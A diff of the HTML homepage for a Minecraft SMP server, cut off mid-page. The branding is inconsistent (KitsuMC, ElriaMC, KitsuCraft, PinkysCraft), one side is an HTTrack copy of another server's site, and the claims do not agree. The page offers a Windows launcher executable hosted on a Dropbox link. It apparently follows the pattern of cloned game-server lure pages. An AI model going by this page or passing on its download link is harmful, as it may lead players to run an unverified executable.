@@ -1,596 +1,650 @@
-    <html lang="en">
-    <head>
+<html lang="tr">
+
+<!-- Mirrored from kittiescraft.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 23 Dec 2025 22:02:43 GMT -->
+
+<!-- Mirrored from kittiescraft.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 11 Jan 2026 21:25:58 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>KitsuMC | ElriaCraft SMP — Launcher & Custom Server</title>
-    <link rel="canonical" href="https://kitsumc.com/">
-    <meta name="robots" content="index, follow">
-    <meta name="keywords" content="KitsuMC, KitsuMC launcher, KitsuMC download, KitsuCraft SMP, Kitsune Minecraft SMP, Minecraft launcher">
-    <meta name="description" content="Download the KitsuMC Launcher and join the most mystical Minecraft SMP server. Kitsune survival, mystic fox worlds, custom mods, zero-toxicity community. Free!">
-    <meta name="theme-color" content="#ff8c1a">
-    <meta property="og:title" content="KitsuMC | KitsuCraft SMP">
-    <meta property="og:description" content="The most mystical Minecraft SMP you've ever seen.">
-    <meta property="og:image" content="https://kitsumc.com/content.png">
-    <meta property="og:image:secure_url" content="https://kitsumc.com/content.png">
-    <meta property="og:image:type" content="image/png">
-    <meta property="og:image:width" content="1448">
-    <meta property="og:image:height" content="1086">
-    <meta property="og:image:alt" content="KitsuCraft cherry blossom Minecraft build at sunset">
-    <meta property="og:url" content="https://kitsumc.com/">
-    <meta property="og:site_name" content="KitsuMC">
+    <title>PinkysCraft - The Pinkys SMP</title>
+    <link rel="icon" href="images/logo.png" type="image/png">
+    
+    <!-- Open Graph / Discord / Facebook -->
     <meta property="og:type" content="website">
+    <meta property="og:url" content="index-2.html">
+    <meta property="og:title" content="PinkysCraft - The Pinkys Minecraft SMP Server">
+    <meta property="og:description" content="Join thousands of players in a pink-white, zero-toxicity Hello Kitty SMP experience. Features a balanced economy, weekly events, protected plots, and the coziest community ever!">
+    <meta property="og:image" content="images/back.jpg">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta property="og:image:type" content="image/jpeg">
+    
+    <!-- Twitter Card -->
     <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="KitsuMC | KitsuCraft SMP">
-    <meta name="twitter:description" content="The most mystical Minecraft SMP you've ever seen.">
-    <meta name="twitter:image" content="https://kitsumc.com/content.png">
-    <link rel="image_src" href="https://kitsumc.com/content.png">
-    <link rel="icon" type="image/png" href="/favicon.png">
-    <link rel="icon" href="/favicon.ico">
-
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800;900&family=Silkscreen:wght@400;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
-    <link rel="stylesheet" href="index.css">
-    <link rel="stylesheet" href="home.css">
-    <script>(function(){var s=localStorage.getItem('kitsu-theme');if(s)document.documentElement.setAttribute('data-theme',s);}());</script>
+    <meta name="twitter:url" content="index-2.html">
+    <meta name="twitter:title" content="PinkysCraft - The Pinkys Minecraft SMP Server">
+    <meta name="twitter:description" content="Join thousands of players in a pink-white, zero-toxicity Hello Kitty SMP experience. Features a balanced economy, weekly events, protected plots, and the coziest community ever!">
+    <meta name="twitter:image" content="images/back.jpg">
+    
+    <!-- Additional Meta -->
+    <meta name="description" content="Join thousands of players in a pink-white, zero-toxicity Hello Kitty SMP experience. Features a balanced economy, weekly events, protected plots, and the coziest community ever!">
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=VT323&amp;family=Nunito:wght@400;600;700;800&amp;display=swap" rel="stylesheet">
+    <!-- Animation Library -->
+    <link href="cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        /* Snow Animation */
+        .snow-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 1;
+            overflow: hidden;
+        }
+        
+        .snowflake {
+            position: absolute;
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 1em;
+            font-family: Arial, sans-serif;
+            text-shadow: 0 0 5px rgba(255, 182, 193, 0.5);
+            animation: snowfall linear infinite;
+            top: -10px;
+        }
+        
+        @keyframes snowfall {
+            0% {
+                transform: translateY(0vh) translateX(0) rotate(0deg);
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(100vh) translateX(var(--drift)) rotate(360deg);
+                opacity: 0;
+            }
+        }
+        
+        /* Winter Theme Section */
+        .winter-section {
+            background: linear-gradient(180deg, #e8f4f8 0%, #fff0f5 100%);
+            position: relative;
+            overflow: hidden;
+            padding: 100px 10%;
+        }
+        
+        .winter-section::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                radial-gradient(circle at 20% 30%, rgba(255, 182, 193, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 80% 70%, rgba(255, 182, 193, 0.1) 0%, transparent 50%);
+            pointer-events: none;
+        }
+        
+        .winter-content {
+            position: relative;
+            z-index: 2;
+        }
+        
+        .snow-icon {
+            font-size: 64px;
+            animation: float 3s ease-in-out infinite;
+            display: inline-block;
+            margin-bottom: 20px;
+        }
+        
+        @keyframes float {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-20px); }
+        }
+    </style>
 </head>
-
 <body>
+    <!-- Snow Animation -->
+    <div class="snow-container" id="snow-container"></div>
 
     <!-- Page Loader -->
-    <div id="page-loader" aria-hidden="true" role="presentation">
-        <div class="loader-pixels" aria-hidden="true">
-            <span class="loader-px" style="left:10%;top:18%;--d:3.8s;--delay:0s"></span>
-            <span class="loader-px" style="left:84%;top:14%;--d:4.6s;--delay:0.7s"></span>
-            <span class="loader-px" style="left:70%;top:76%;--d:3.3s;--delay:1.3s"></span>
-            <span class="loader-px" style="left:22%;top:82%;--d:5.1s;--delay:0.4s"></span>
-            <span class="loader-px" style="left:58%;top:32%;--d:4.2s;--delay:1.9s"></span>
-            <span class="loader-px" style="left:38%;top:90%;--d:3.7s;--delay:1.1s"></span>
-        </div>
-        <img src="logo.png" alt="" class="loader-logo" width="80" height="80" fetchpriority="high">
-        <span class="loader-wordmark">ElriaMC ★</span>
-        <div class="loader-track"><div id="loader-bar"></div></div>
+    <div id="page-loader">
+        <div class="loader-spinner"></div>
+        <div class="loader-text">LOADING...</div>
     </div>
 
-    <div class="noise-overlay" aria-hidden="true" style="position:fixed;top:0;left:0;width:100%;height:100%;opacity:0.03;background-image:url('data:image/svg+xml,%3Csvg viewBox=%220 0 200 200%22 xmlns=%22http://www.w3.org/2000/svg%22%3E%3Cfilter id=%22n%22%3E%3CfeTurbulence type=%22fractalNoise%22 baseFrequency=%220.65%22 numOctaves=%223%22 stitchTiles=%22stitch%22/%3E%3C/filter%3E%3Crect width=%22100%25%22 height=%22100%25%22 filter=%22url(%23n)%22/%3E%3C/svg%3E');pointer-events:none;z-index:9999;"></div>
-
-    <!-- Navigation -->
-    <nav aria-label="Main navigation">
-                <div class="nav-container">
-            <div class="nav-left">
-                <a class='brand' href='/'>
-                    <img src="logo.png" alt="KitsuMC logo" class="brand-icon">
-                </a>
-                <div class="online-pill" aria-label="Players online">
-                    <span class="status-dot" aria-hidden="true"></span>
-                    Online: <span id="player-count">0</span>
+    <!-- Navbar -->
+    <nav class="navbar animate__animated animate__fadeInDown">
+        <div class="nav-brand">
+            <a href='/' style='text-decoration: none; display: flex; align-items: center; gap: 15px;'>
+                <img src="images/logo.png" alt="Logo" class="nav-logo wobble-hover">
+                <div class="online-status">
+                    <span class="status-dot"></span>
+                    <span>Online: <b id="player-count">154</b></span>
                 </div>
-            </div>
-
-            <div class="nav-center">
-                <div class="nav-links">
-                    <a class='active' href='/'>Home</a>
-                    <a href='/leaderboard'>Leaderboard</a>
-                    <a href='/shop'>Shop</a>
-                    <a href='/launcher'>Download</a>
-                    <a href='/wiki'>FAQ</a>
-                    <a href='/news'>News</a>
-                </div>
-            </div>
-
-            <div class="nav-right">
-                <button class="theme-toggle" id="themeToggle" aria-label="Toggle light/dark theme">
-                    <i class="fa-solid fa-moon" aria-hidden="true"></i>
-                </button>
-                <a class='server-info-btn' href='/info'>
-                    <i class="fa-solid fa-circle-info" aria-hidden="true"></i>
-                    <span>Server Info</span>
-                </a>
-                <a class='signup-btn' href='/join'>Sign Up Now!</a>
-            </div>
+            </a>
+        </div>
+        <div class="nav-links">
+            <a class='hvr-underline-from-center' href='/' style='color: var(--dark-pink);'>Home</a>
+            <a class='hvr-underline-from-center' href='/leaderboard'>Leaderboard</a>
+            <a class='hvr-underline-from-center' href='/shop'>Shop</a>
+            <a class='hvr-underline-from-center' href='/gallery'>Gallery</a>
+            <a href="#download" class="hvr-underline-from-center">Download</a>
+            <a href="#faq" class="hvr-underline-from-center">FAQ</a>
+        </div>
+        <div class="nav-actions">
+            <button id="dark-mode-toggle" class="btn btn-small btn-white" style="margin-right: 10px;" title="Toggle Dark Mode">
+                <i class="fas fa-moon" id="dark-mode-icon"></i>
+            </button>
+            <a class='btn btn-small btn-white' href='/info' style='margin-right: 10px;'>
+                <i class="fas fa-info-circle" style="font-size: 18px;"></i> Server Info
+            </a>
+            <a class='btn btn-small btn-primary pulse-effect' href='/signup'>Sign Up Now!</a>
         </div>
     </nav>
 
     <!-- Hero Section -->
-    <section class="home-hero" aria-label="Welcome">
-        <!-- Background video -->
-        <video class="hero-video-bg" autoplay muted loop playsinline aria-hidden="true">
-            <source src="https://pinkyslauncher.com/images/hellokitty.mp4" type="video/mp4">
-        </video>
-        <div class="hero-overlay" aria-hidden="true"></div>
-
-        <!-- Floating pixel particles -->
-        <div class="floating-particles" aria-hidden="true">
-            <span class="particle" style="--x:7%;--y:18%;--s:0.75;--d:4.2s;--delay:0s"></span>
-            <span class="particle" style="--x:14%;--y:72%;--s:0.5;--d:5.1s;--delay:0.8s"></span>
-            <span class="particle" style="--x:78%;--y:10%;--s:0.6;--d:6s;--delay:1.2s"></span>
-            <span class="particle" style="--x:87%;--y:58%;--s:0.45;--d:4.7s;--delay:0.3s"></span>
-            <span class="particle" style="--x:63%;--y:80%;--s:0.55;--d:5.5s;--delay:1.8s"></span>
-            <span class="particle" style="--x:33%;--y:6%;--s:0.4;--d:6.3s;--delay:0.6s"></span>
-            <span class="particle" style="--x:52%;--y:88%;--s:0.65;--d:4.4s;--delay:2.1s"></span>
-            <span class="particle" style="--x:92%;--y:28%;--s:0.5;--d:5.8s;--delay:1.5s"></span>
-            <span class="particle" style="--x:42%;--y:55%;--s:0.35;--d:7s;--delay:2.5s"></span>
-            <span class="particle" style="--x:24%;--y:38%;--s:0.45;--d:4.9s;--delay:1s"></span>
-        </div>
-
-        <div class="hero-body">
-            <!-- Left: content -->
-            <div class="hero-content">
-                <div class="hero-badges">
-                    <span class="hero-badge"><i class="fa-solid fa-seedling"></i> Cherry Blossom SMP</span>
-                    <span class="hero-badge"><i class="fa-solid fa-shield-halved"></i> Anti-Cheat Protected</span>
-                    <span class="hero-badge"><i class="fa-solid fa-users"></i> Kitsune Community</span>
-                </div>
-
-                <h1>THE<br><span class="highlight">ElriaMC</span><br>MINECRAFT<br>SMP SERVER</h1>
-
-                <p class="hero-desc">Join thousands of players in a cozy, zero-toxicity Minecraft SMP. Cherry blossom biomes, seasonal events, protected plots, and the friendliest community you'll find.</p>
-
-                <div class="hero-ctas">
-                    <a href="https://www.dropbox.com/scl/fi/1qpomi4ilivical3illkj/ElriaClient.exe?rlkey=5zqwd1wa6g19sgglcqw04agll&st=p64j2u9y&dl=0" class="btn-download" data-download="windows">
-                        <i class="fa-brands fa-windows" aria-hidden="true"></i>
-                        Download for Windows
-                    </a>
-                    <a href="https://www.dropbox.com/scl/fi/1qpomi4ilivical3illkj/ElriaClient.exe?rlkey=5zqwd1wa6g19sgglcqw04agll&st=p64j2u9y&dl=1" class="btn-features" download="https://www.dropbox.com/scl/fi/1qpomi4ilivical3illkj/ElriaClient.exe?rlkey=5zqwd1wa6g19sgglcqw04agll&st=p64j2u9y&dl=1">
-                        <i class="fa-solid fa-star" aria-hidden="true"></i>
-                        Download For Windows (Mods)
-                    </a>
-                </div>
+    <header class="hero">
+        <div class="hero-content animate__animated animate__fadeInLeft">
+            <div class="hero-tags">
+                <span class="tag"><i class="fas fa-heart"></i> Hello Kitty</span>
+                <span class="tag"><i class="fas fa-cube"></i> SMP</span>
+                <span class="tag"><i class="fas fa-users"></i> Community</span>
             </div>
-
-            <!-- Right: mascot -->
-            <div class="hero-mascot" aria-hidden="true">
-                <img src="mascot-fox.webp" alt="" class="hero-character">
-            </div>
-        </div>
-    </section>
-
-    <!-- Stats Bar -->
-    <div class="stats-bar" role="region" aria-label="Server statistics">
-        <div class="stats-inner">
-            <div class="stat-item">
-                <div class="stat-icon" aria-hidden="true"><i class="fa-solid fa-users"></i></div>
-                <div class="stat-text">
-                    <strong><span class="stat-count" data-target="1400">0</span>+</strong>
-                    <span>Registered Players</span>
-                </div>
-            </div>
-            <div class="stat-divider" aria-hidden="true"></div>
-            <div class="stat-item">
-                <div class="stat-icon" aria-hidden="true"><i class="fa-solid fa-cube"></i></div>
-                <div class="stat-text">
-                    <strong><span class="stat-count" data-target="24">0</span></strong>
-                    <span>Custom Mods</span>
-                </div>
-            </div>
-            <div class="stat-divider" aria-hidden="true"></div>
-            <div class="stat-item">
-                <div class="stat-icon" aria-hidden="true"><i class="fa-solid fa-server"></i></div>
-                <div class="stat-text">
-                    <strong>99.9%</strong>
-                    <span>Uptime</span>
-                </div>
-            </div>
-            <div class="stat-divider" aria-hidden="true"></div>
-            <div class="stat-item">
-                <div class="stat-icon" aria-hidden="true"><i class="fa-solid fa-calendar-star"></i></div>
-                <div class="stat-text">
-                    <strong><span class="stat-count" data-target="48">0</span></strong>
-                    <span>Monthly Events</span>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- Marquee -->
-    <div class="marquee" aria-hidden="true">
-        <div class="marquee-content">
-            <span>✦ SURVIVAL SMP</span>
-            <span>✦ CUSTOM PLUGINS</span>
-            <span>✦ PINK WORLDS</span>
-            <span>✦ KAWAII BUILDS</span>
-            <span>✦ FAIR PLAY</span>
-            <span>✦ SURVIVAL SMP</span>
-            <span>✦ CUSTOM PLUGINS</span>
-            <span>✦ PINK WORLDS</span>
-            <span>✦ KAWAII BUILDS</span>
-            <span>✦ FAIR PLAY</span>
-        </div>
-    </div>
-
-    <!-- About Section -->
-    <section id="about" class="about-section" aria-label="About KitsuMC">
-        <div class="about-inner">
-            <div class="about-text reveal">
-                <h2>A World Built for <span class="accent-word">Builders</span></h2>
-                <p>ElriaMC started as a small friend group server in 2022. Four years later, it's a thriving community of builders, adventurers, and collectors who share one thing: a love for cozy, creative Minecraft.</p>
-                <p>Every feature, plugin, and biome was built with the community in mind. No pay-to-win, no toxic gameplay, no corners cut.</p>
-
-                <div class="about-perks">
-                    <div class="perk-item"><i class="fa-solid fa-check"></i> Hand-crafted cherry blossom biomes and pink crystal caves</div>
-                    <div class="perk-item"><i class="fa-solid fa-check"></i> Custom launcher with auto-updating optimized mod pack</div>
-                    <div class="perk-item"><i class="fa-solid fa-check"></i> Monthly seasonal events with exclusive cosmetic rewards</div>
-                    <div class="perk-item"><i class="fa-solid fa-check"></i> Active moderation team, zero tolerance for griefing</div>
-                    <div class="perk-item"><i class="fa-solid fa-check"></i> Proximity voice chat via Simple Voice Chat mod</div>
-                </div>
-
-                <a href="#" class="btn-download" data-download="windows">
-                    <i class="fa-brands fa-windows" aria-hidden="true"></i>
-                    Download Launcher
+            <h1 class="pixel-text">The<br><span class="highlight-pink">PInkys</span><br>Minecraft<br>SMP Server</h1>
+            <p class="hero-desc">Join thousands of players in a pink-white, zero-toxicity Hello Kitty SMP experience. Features a balanced economy, weekly events, protected plots, and the coziest community ever!</p>
+            <div class="hero-btns">
+                <a href="#download" class="btn btn-large btn-primary pulse-effect">
+                    <i class="fab fa-windows"></i> Download for Windows
+                </a>
+                <a href="#features" class="btn btn-large btn-white">
+                    <i class="fas fa-star"></i> See Features
                 </a>
             </div>
+        </div>
+        <div class="hero-image animate__animated animate__fadeInRight">
+            <img src="images/emoji.png" alt="Hello Kitty" class="hero-character floating">
+            <div class="floating-particles">
+            </div>
+        </div>
+        <div class="hero-bg-overlay"></div>
+        <video autoplay muted loop class="hero-video-bg">
+            <source src="images/hellokitty.mp4" type="video/mp4">
+        </video>
+    </header>
 
-            <div class="about-image reveal reveal-d2">
-                <img src="about-screenshot.png" alt="KitsuMC in-game world screenshot">
-                <div class="about-image-deco" aria-hidden="true"></div>
+    <!-- Stats Section -->
+    <section class="stats-bar scroll-reveal">
+        <div class="stat-item">
+            <i class="fas fa-user-friends"></i>
+            <div class="stat-info">
+                <h3><span class="counter" data-target="1000">0</span>+</h3>
+                <p>Registered Pinkys</p>
+            </div>
+        </div>
+        <div class="stat-item">
+            <i class="fas fa-home"></i>
+            <div class="stat-info">
+                <h3><span class="counter" data-target="700">0</span>+</h3>
+                <p>Claimed Plots</p>
+            </div>
+        </div>
+        <div class="stat-item">
+            <i class="fas fa-magic"></i>
+            <div class="stat-info">
+                <h3><span class="counter" data-target="200">0</span>+</h3>
+                <p>Unique Cosmetics</p>
             </div>
         </div>
     </section>
 
-    <!-- Winter Season Section -->
-    <section class="seasonal-section" aria-label="Winter Season">
-        <span class="season-deco" aria-hidden="true">❄️</span>
-        <span class="season-deco-right" aria-hidden="true">⛄</span>
-        <div class="section-heading reveal">
-            <div class="season-eyebrow"><i class="fa-solid fa-snowflake"></i> Winter Season</div>
-            <h2>Winter <span class="accent-word">Wonderland</span></h2>
-            <p>Experience the magic of winter in ElriaMC. Seasonal builds, events, and exclusive cosmetics await.</p>
+    <!-- About Section (New) -->
+    <section class="section about-section" style="background: white;">
+        <div class="about-container" style="display: flex; align-items: center; gap: 50px; max-width: 1200px; margin: 0 auto;">
+            <div class="about-image scroll-reveal hover-scale" style="flex: 1;">
+                <img src="images/image%20(1).jpg" alt="About Us" style="width: 100%; border-radius: 30px; box-shadow: 20px 20px 0 var(--light-pink); transition: all 0.3s;">
+            </div>
+            <div class="about-content scroll-reveal" style="flex: 1; text-align: left;">
+                <span class="section-badge">ABOUT US</span>
+                <h2 class="section-title pixel-text" style="text-align: left;">Welcome to the Family</h2>
+                <p style="font-size: 18px; color: var(--text-light); line-height: 1.8; margin-bottom: 30px;">
+                    PinkysCraft isn't just a server; it's a home. Founded in 2024 with a vision to create the most wholesome and toxic-free Minecraft community, we've grown into a family of thousands.
+                    <br><br>
+                    Whether you love building cute cottages, exploring survival worlds, or just chatting in the lobby, there's a spot for you here.
+                </p>
+                <a href="#features" class="btn btn-large btn-primary" style="display: inline-block; margin-top: 20px;">Learn More</a>
+            </div>
         </div>
-        <div class="seasonal-cards">
-            <div class="season-card reveal reveal-d1">
-                <div class="season-card-icon" aria-hidden="true">
-                    <img src="https://pinkyslauncher.com/winter-images/christmas-tree.png" alt="Holiday Builds" width="36" height="36" style="object-fit:contain;">
-                </div>
-                <h3>Holiday Builds</h3>
-                <p>Create beautiful winter-themed structures with special holiday blocks and decorations available all season.</p>
+    </section>
+
+    <!-- Winter Theme Section -->
+    <section class="winter-section particle-bg">
+        <div class="winter-content">
+            <div class="section-header scroll-reveal">
+                <img src="winter-images/snowflake.png" alt="Snowflake" class="snow-icon" style="width: 64px; height: 64px; object-fit: contain;">
+                <span class="section-badge" style="background: rgba(255,255,255,0.9); color: #4a90e2;">WINTER SEASON</span>
+                <h2 class="section-title pixel-text" style="color: #2d3436;">Winter Wonderland</h2>
+                <p class="section-subtitle" style="color: #636e72; text-align: center;">Experience the magic of winter in PinkysCraft!</p>
             </div>
-            <div class="season-card reveal reveal-d2">
-                <div class="season-card-icon" aria-hidden="true">
-                    <img src="https://pinkyslauncher.com/winter-images/snowflake.png" alt="Winter Events" width="36" height="36" style="object-fit:contain;">
+            <div class="features-grid" style="grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); margin-top: 50px;">
+                <div class="feature-card scroll-reveal card-3d glass-enhanced" style="background: rgba(255,255,255,0.9); backdrop-filter: blur(10px);">
+                    <div class="feature-icon-wrapper hover-scale" style="background: linear-gradient(135deg, #e8f4f8, #fff0f5);">
+                        <img src="winter-images/christmas-tree.png" alt="Christmas Tree" style="width: 64px; height: 64px; object-fit: contain; transition: transform 0.3s;">
+                    </div>
+                    <h3 class="pixel-text">Holiday Builds</h3>
+                    <p>Create beautiful winter-themed structures with special holiday blocks and decorations!</p>
                 </div>
-                <h3>Winter Events</h3>
-                <p>Participate in special winter events, gift hunts, and snowball fights with other KitsuMC players.</p>
+                <div class="feature-card scroll-reveal card-3d glass-enhanced" style="background: rgba(255,255,255,0.9); backdrop-filter: blur(10px);">
+                    <div class="feature-icon-wrapper hover-scale" style="background: linear-gradient(135deg, #e8f4f8, #fff0f5);">
+                        <img src="winter-images/snowflake.png" alt="Snowflake" style="width: 64px; height: 64px; object-fit: contain; transition: transform 0.3s;">
+                    </div>
+                    <h3 class="pixel-text">Winter Events</h3>
+                    <p>Participate in special winter events, gift hunts, and snowball fights with other players!</p>
+                </div>
+                <div class="feature-card scroll-reveal card-3d glass-enhanced" style="background: rgba(255,255,255,0.9); backdrop-filter: blur(10px);">
+                    <div class="feature-icon-wrapper hover-scale" style="background: linear-gradient(135deg, #e8f4f8, #fff0f5);">
+                        <img src="winter-images/snowman.png" alt="Snowman" style="width: 64px; height: 64px; object-fit: contain; transition: transform 0.3s;">
+                    </div>
+                    <h3 class="pixel-text">Limited Cosmetics</h3>
+                    <p>Get exclusive winter-themed cosmetics, skins, and pets available only during the season!</p>
+                </div>
             </div>
-            <div class="season-card reveal reveal-d3">
-                <div class="season-card-icon" aria-hidden="true">
-                    <img src="https://pinkyslauncher.com/winter-images/snowman.png" alt="Limited Cosmetics" width="36" height="36" style="object-fit:contain;">
-                </div>
-                <h3>Limited Cosmetics</h3>
-                <p>Exclusive winter-themed cosmetics, skins, and pets available only during the season. Earn through gameplay.</p>
+        </div>
+    </section>
+
+    <!-- Latest Updates Section (New) -->
+    <section class="section" style="background: white;">
+        <div class="section-header">
+            <span class="section-badge">NEWS</span>
+            <h2 class="section-title pixel-text">Latest Updates</h2>
+            <p class="section-subtitle">Keep up with the latest server changes.</p>
+        </div>
+        <div class="features-grid" style="grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));">
+            <div class="feature-card" style="text-align: left; padding: 30px;">
+                <span class="section-badge" style="background: #e91e63; color: white;">UPDATE</span>
+                <h3 style="margin-top: 10px;">Season 5: Christmas</h3>
+                <p style="font-size: 14px; color: #aaa; margin-bottom: 15px;"><i class="far fa-calendar"></i> Dec 15, 2024</p>
+                <p>Has been updated with a new Christmas theme and new items.</p>
+            </div>
+            <div class="feature-card" style="text-align: left; padding: 30px;">
+                <span class="section-badge" style="background: #9b59b6; color: white;">EVENT</span>
+                <h3 style="margin-top: 10px;">Holiday Gift Hunt</h3>
+                <p style="font-size: 14px; color: #aaa; margin-bottom: 15px;"><i class="far fa-calendar"></i> Dec 3, 2025</p>
+                <p>Find hidden presents around the spawn to win limited edition cosmetics.</p>
+            </div>
+            <div class="feature-card" style="text-align: left; padding: 30px;">
+                <span class="section-badge" style="background: #f1c40f; color: white;">MAINTENANCE</span>
+                <h3 style="margin-top: 10px;">Network Optimization</h3>
+                <p style="font-size: 14px; color: #aaa; margin-bottom: 15px;"><i class="far fa-calendar"></i> Dec 10, 2024</p>
+                <p>We upgraded our servers to provide a lag-free experience for everyone.</p>
             </div>
         </div>
     </section>
 
     <!-- Features Section -->
-    <section class="features-section" aria-label="Features">
-        <div class="section-heading reveal">
-            <h2>What Makes <span class="accent-word">KitsuMC</span> Different</h2>
-            <p>Six years of polish went into building a server that's safe, stable, and genuinely fun to play on.</p>
+    <section id="features" class="section features-section" style="background: var(--bg-pink);">
+        <div class="section-header scroll-reveal">
+            <span class="section-badge">WHY JOIN US?</span>
+            <h2 class="section-title pixel-text text-gradient">Server Features</h2>
+            <p class="section-subtitle">Vanilla+ balance, a Hello Kitty touch, and community-first rules.</p>
         </div>
-
+        
         <div class="features-grid">
-            <div class="feature-card reveal reveal-d1">
-                <div class="fc-icon" aria-hidden="true"><i class="fa-solid fa-bolt"></i></div>
-                <h3>Optimized Performance</h3>
-                <p>Pre-configured Sodium + Lithium mod pack delivers 2-3× the FPS of vanilla. The launcher handles everything automatically.</p>
+            <div class="feature-card scroll-reveal card-3d">
+                <div class="feature-icon-wrapper hover-scale">
+                    <div class="feature-icon"><i class="fas fa-heart" style="color:var(--dark-pink);font-size:40px;"></i></div>
+                </div>
+                <h3 class="pixel-text">Hello Kitty Theme</h3>
+                <p>Immerse yourself in a custom pink-white UI, cute cosmetics, and a heart-filled world design.</p>
             </div>
-            <div class="feature-card reveal reveal-d2">
-                <div class="fc-icon" aria-hidden="true"><i class="fa-solid fa-shield-cat"></i></div>
-                <h3>Fair Play Enforcement</h3>
-                <p>HWID-linked bans, server-side anti-xray, and integrity checks keep the experience honest for everyone.</p>
+            <div class="feature-card scroll-reveal card-3d">
+                <div class="feature-icon-wrapper hover-scale">
+                    <div class="feature-icon"><i class="fas fa-hammer" style="color:var(--dark-pink);font-size:40px;"></i></div>
+                </div>
+                <h3 class="pixel-text">Vanilla+ SMP</h3>
+                <p>A fair survival experience. We keep it close to vanilla but add quality of life improvements.</p>
             </div>
-            <div class="feature-card accent-card reveal reveal-d3">
-                <div class="fc-icon" aria-hidden="true"><i class="fa-solid fa-calendar-days"></i></div>
-                <h3>Seasonal Events</h3>
-                <p>Themed monthly events — Cherry Blossom Festival, Winter Wonderland, and more — with limited cosmetics you can't buy anywhere.</p>
+            <div class="feature-card scroll-reveal card-3d">
+                <div class="feature-icon-wrapper hover-scale">
+                    <div class="feature-icon"><i class="fas fa-coins" style="color:var(--dark-pink);font-size:40px;"></i></div>
+                </div>
+                <h3 class="pixel-text">Economy & Market</h3>
+                <p>Player-driven market with secure trading booths and balanced ways to earn currency.</p>
             </div>
-            <div class="feature-card reveal reveal-d1">
-                <div class="fc-icon" aria-hidden="true"><i class="fa-solid fa-microphone-lines"></i></div>
-                <h3>Proximity Voice Chat</h3>
-                <p>Simple Voice Chat lets you talk to players near you in the world. No external software required — it's built into the launcher.</p>
+            <div class="feature-card scroll-reveal card-3d">
+                <div class="feature-icon-wrapper hover-scale">
+                    <div class="feature-icon"><i class="fas fa-shield-alt" style="color:var(--dark-pink);font-size:40px;"></i></div>
+                </div>
+                <h3 class="pixel-text">Protected Plots</h3>
+                <p>Claim your land easily. Your cute builds are 100% safe from griefing with our protection system.</p>
             </div>
-            <div class="feature-card reveal reveal-d2">
-                <div class="fc-icon" aria-hidden="true"><i class="fa-solid fa-wand-sparkles"></i></div>
-                <h3>Custom Cosmetics</h3>
-                <p>Earn hats, trails, and title prefixes through gameplay and events. None of them affect balance. All of them look great.</p>
+            <div class="feature-card scroll-reveal card-3d">
+                <div class="feature-icon-wrapper hover-scale">
+                    <div class="feature-icon"><i class="fas fa-calendar-check" style="color:var(--dark-pink);font-size:40px;"></i></div>
+                </div>
+                <h3 class="pixel-text">Daily Events</h3>
+                <p>Participate in fashion shows, building contests, and parkour maps to win exclusive rewards.</p>
             </div>
-            <div class="feature-card reveal reveal-d3">
-                <div class="fc-icon" aria-hidden="true"><i class="fa-solid fa-globe"></i></div>
-                <h3>Active Staff Team</h3>
-                <p>Moderators are online daily. Reports are addressed within hours, not days. The server has never gone down unannounced.</p>
+            <div class="feature-card scroll-reveal card-3d">
+                <div class="feature-icon-wrapper hover-scale">
+                    <div class="feature-icon"><i class="fas fa-heart" style="color:var(--dark-pink);font-size:40px;"></i></div>
+                </div>
+                <h3 class="pixel-text">Zero Toxicity</h3>
+                <p>Our #1 priority. Active staff ensures a warm, respectful, and safe environment for everyone.</p>
             </div>
         </div>
     </section>
 
-    <!-- News Section -->
-    <section class="home-news-section" aria-label="Latest news">
-        <div class="section-header-row reveal">
-            <h2>LATEST <span style="color:var(--accent)">NEWS</span></h2>
-            <a class='view-all-link' href='/news'>View all updates <i class="fa-solid fa-arrow-right fa-xs"></i></a>
-        </div>
-
-        <div class="news-grid-home">
-            <a class='news-card-home reveal reveal-d1' href='/news'>
-                <div class="news-card-meta">
-                    <time datetime="2025-02-14">14 Feb 2025</time>
-                    <span class="news-tag tag-release">release</span>
-                </div>
-                <h3>KitsuMC 7.0, now available</h3>
-                <p>Full NeoForge support, rebuilt launcher UI, and a new server-side cosmetics system that drops physical item requirements.</p>
-                <div class="news-card-footer-row">
-                    <span class="read-more-link">Read more <i class="fa-solid fa-arrow-right fa-xs"></i></span>
-                </div>
-            </a>
-
-            <a class='news-card-home reveal reveal-d2' href='/news'>
-                <div class="news-card-meta">
-                    <time datetime="2024-01-07">07 Jan 2024</time>
-                    <span class="news-tag tag-release">release</span>
-                </div>
-                <h3>KitsuMC 6.1, now available</h3>
-                <p>Bug fixes targeting the minimap sync issue, a performance regression on large builds, and two minor UI inconsistencies.</p>
-                <div class="news-card-footer-row">
-                    <span class="read-more-link">Read more <i class="fa-solid fa-arrow-right fa-xs"></i></span>
-                </div>
-            </a>
-
-            <a class='news-card-home reveal reveal-d3' href='/news'>
-                <div class="news-card-meta">
